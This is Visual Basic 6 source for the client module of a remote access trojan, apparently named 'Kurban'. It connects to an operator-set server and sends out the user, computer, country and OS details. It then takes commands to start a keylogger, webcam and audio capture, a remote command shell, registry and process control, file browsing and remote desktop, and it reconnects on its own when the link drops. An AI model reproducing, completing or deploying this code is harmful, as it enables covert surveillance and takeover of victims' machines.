VERSION 5.00
Begin VB.Form FrmCliente 
   Caption         =   "Cliente"
   ClientHeight    =   1500
   ClientLeft      =   60
   ClientTop       =   600
   ClientWidth     =   2085
   Icon            =   "FrmCliente.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1500
   ScaleWidth      =   2085
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "FrmCliente"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
' ---------------------------------------------------
'Min OS: Windows XP
'Published: Harmmy
' ---------------------------------------------------

Private MasterID As Long
Private WithEvents Timer1 As cTimer
Attribute Timer1.VB_VarHelpID = -1

Private Sub Form_Load()

'*-----------Configuración------------------*

    ServerIP = "127.0.0.1"
    
    ServerPuerto = 100
    
    ServerName = "Kurban"
    
'*-----------------------------------------*

    Set cColl = New Collection
    Set Timer1 = New cTimer
    
    ReDim Id_List(0)

    WinSock32.InitWinSock Me
    
    MasterID = WinSock32.WsConnect(ServerIP, ServerPuerto)
    
    If MasterID <> 0 Then
        SendPCInfo
    Else
        Timer1.CreateTimer 1000
    End If

End Sub

Private Function SendPCInfo()
    Dim sBuffer As String
    
    sBuffer = "0" & Delimiter & _
              ServerName & Delimiter & _
              GetCountry & Delimiter & _
              GetUserName & "@" & GetComputerName & Delimiter & _
              VersionToName(NativeGetVersion) & Delimiter & _
              GetCountryCode
              
              
    WinSock32.SendData MasterID, sBuffer
 
End Function

Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHandler
    Dim Cmd() As String
    Dim sBuffer As String
    Dim ExplorerID As Long
    Dim WebCamID As Long
    Dim KeyLoggerID As Long
    Dim ConsoleID As Long
    Dim RegistryID As Long
    Dim ProcessID As Long
    Dim AudioID As Long
    Dim DesktopID As Long
    
    Select Case ID
    
        Case MasterID
        
              Cmd = Split(Data, Delimiter)
              
              Select Case Cmd(0)
              
                Case 0 'Explorer
                
                    ExplorerID = WinSock32.WsConnect(ServerIP, ServerPuerto)
                   
                    If ExplorerID <> 0 Then
                    
                        Dim cExplorer As ClsExplorer
                        Set cExplorer = New ClsExplorer
                        cExplorer.ExplorerID = ExplorerID
                        cColl.Add cExplorer, CStr(ExplorerID)
                        
                        sBuffer = 1 & Delimiter & Cmd(1)
                        WinSock32.SendData ExplorerID, sBuffer
                        
                    End If
                
                Case 1 'WebCam
                    Debug.Print "Requiere WebCam", hwndCap
                
                    If hwndCap Then Exit Sub
                    
                    WebCamID = WinSock32.WsConnect(ServerIP, ServerPuerto)
                    
                    If WebCamID <> 0 Then
                    
                        Dim cWebCam As ClsWebCam
                        Set cWebCam = New ClsWebCam
                        cWebCam.ID_Connection = WebCamID
                        cColl.Add cWebCam, CStr(WebCamID)
                            
                        WinSock32.SendData WebCamID, 3 & Delimiter & Cmd(1)
                    
                    End If

                    
                Case 2 'KeyLogger
                    Debug.Print "Requiere KeyLogger", hEdit
                
                    If hEdit Then Exit Sub
                    
                    KeyLoggerID = WinSock32.WsConnect(ServerIP, ServerPuerto)
                    
                    If KeyLoggerID <> 0 Then
                    
                        Dim cKeyLogger As ClsKeyLogger
                        Set cKeyLogger = New ClsKeyLogger
                        cKeyLogger.ID_Connection = KeyLoggerID
                        cColl.Add cKeyLogger, CStr(KeyLoggerID)
                            
                        WinSock32.SendData KeyLoggerID, 4 & Delimiter & Cmd(1)
                    
                    End If
    
                Case 3 'Console
                    Debug.Print "Requiere Console"
                
                    
                    
                    ConsoleID = WinSock32.WsConnect(ServerIP, ServerPuerto, True)
                    
                    If ConsoleID <> 0 Then
                    
                        Dim ClsCmd As ClsCmd
                        Set ClsCmd = New ClsCmd
                        ClsCmd.ID_Connection = ConsoleID
                        cColl.Add ClsCmd, CStr(ConsoleID)
                        
                            
                        WinSock32.SendData ConsoleID, 5 & Delimiter & Cmd(1)

                        ClsCmd.ConnectConsole ConsoleID
                    End If
                    
                Case 4 'Registry
                    RegistryID = WinSock32.WsConnect(ServerIP, ServerPuerto, True)
                    
                    If RegistryID <> 0 Then
                    
                        Dim cRemoteReg As ClsRemoteRegistry
                        Set cRemoteReg = New ClsRemoteRegistry
                        cRemoteReg.ID_Connection = RegistryID
                        cColl.Add cRemoteReg, CStr(RegistryID)
                        
                        WinSock32.SendData RegistryID, 6 & Delimiter & Cmd(1)

                    End If

                Case 5, 6 'Process and windows
                    ProcessID = WinSock32.WsConnect(ServerIP, ServerPuerto, True)
                    
                    If ProcessID <> 0 Then
                    
                        Dim cProcess As ClsProcess
                        Set cProcess = New ClsProcess
                        cProcess.ID_Connection = ProcessID
                        cColl.Add cProcess, CStr(ProcessID)
                        
                        If Cmd(0) = 5 Then
                            WinSock32.SendData ProcessID, 7 & Delimiter & Cmd(1)
                        Else
                            WinSock32.SendData ProcessID, 8 & Delimiter & Cmd(1)
                        End If
                    End If
                Case 7 'Audio
                    AudioID = WinSock32.WsConnect(ServerIP, ServerPuerto, True)
                    
                    If AudioID <> 0 Then
                    
                        Dim cAudio As ClsAudio
                        Set cAudio = New ClsAudio
                        cAudio.ID_Connection = AudioID
                        cColl.Add cAudio, CStr(AudioID)
                        
                        WinSock32.SendData AudioID, 9 & Delimiter & Cmd(1)

                    End If
                    
                
                Case 8 'Remote Screen

                    DesktopID = WinSock32.WsConnect(ServerIP, ServerPuerto, True)
                    
                    If DesktopID <> 0 Then
                    
                        Dim cDesktop As ClsDesktop
                        Set cDesktop = New ClsDesktop
                        cDesktop.ID_Connection = DesktopID
                        cColl.Add cDesktop, CStr(DesktopID)
                        
                        WinSock32.SendData DesktopID, 10 & Delimiter & Cmd(1)
                        
                    End If
                    
              End Select

        Case Else
       
            cColl(CStr(ID)).Socket_DataArrival ID, IP, Puerto, Data
    End Select
    
    Exit Sub
    
ErrHandler:
        'SendError Err.Number, Err.Description
        Debug.Print err.Number, err.Description
        
End Sub

Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    On Error Resume Next
    If ID <> MasterID Then
        cColl(CStr(ID)).Socket_Close ID, IP, Puerto
        cColl.Remove CStr(ID)
    Else
        'ReDim Id_List(0)
        Timer1.CreateTimer 1000
    End If
    If err.Number <> 0 Then Debug.Print "Socket_Close:"; err.Description
End Sub


Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
'
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    
    Dim i As Long
    Set Timer1 = Nothing
    
    For i = 1 To cColl.Count
        cColl(i).ID_Connection = 0
        DoEvents
    Next
    
    Set cColl = Nothing
    WinSock32.TerminateWinSock
    ReDim Id_List(0)
End Sub

Private Sub Timer1_Timer(ByVal ThisTime As Long)
    MasterID = WinSock32.WsConnect(ServerIP, ServerPuerto)
    
    If MasterID <> 0 Then
        SendPCInfo
        Timer1.DestroyTimer
    End If
End Sub


